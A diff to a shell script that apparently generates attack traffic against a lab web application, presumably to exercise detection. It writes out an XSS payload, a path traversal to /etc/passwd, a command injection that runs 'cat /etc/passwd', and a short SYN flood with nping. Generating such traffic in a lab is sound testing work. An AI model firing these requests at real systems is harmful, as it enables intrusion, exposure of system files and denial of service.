@@ -27,13 +27,13 @@ curl -s -o /dev/null -w "  stored-style XSS -> HTTP %{http_code}\n" \
   "http://$TARGET:$PORT/#/search?q=<img src=x onerror=alert(1)>"
 
 section "4/5 Directory traversal + command injection payloads"
-curl -s -o /dev/null -w "  path traversal -> HTTP %{http_code}\n" \
+curl -s --path-as-is -o /dev/null -w "  path traversal -> HTTP %{http_code}\n" \
   "http://$TARGET:$PORT/ftp/../../../../etc/passwd"
 curl -s -o /dev/null -w "  cmd injection -> HTTP %{http_code}\n" \
   "http://$TARGET:$PORT/rest/products/1/reviews;cat%20/etc/passwd"
 
 section "5/5 DoS-style SYN flood (short burst — lab only)"
-timeout 3 hping3 -S -p "$PORT" --flood "$TARGET" || true
+timeout 3 nping --tcp -p "$PORT" --flags syn --rate 500 --count 100000 --no-capture -q "$TARGET" || true
 
 echo
 echo "Done. Traffic generated for: port scan, SQLi, XSS, path traversal, cmd injection, SYN flood."
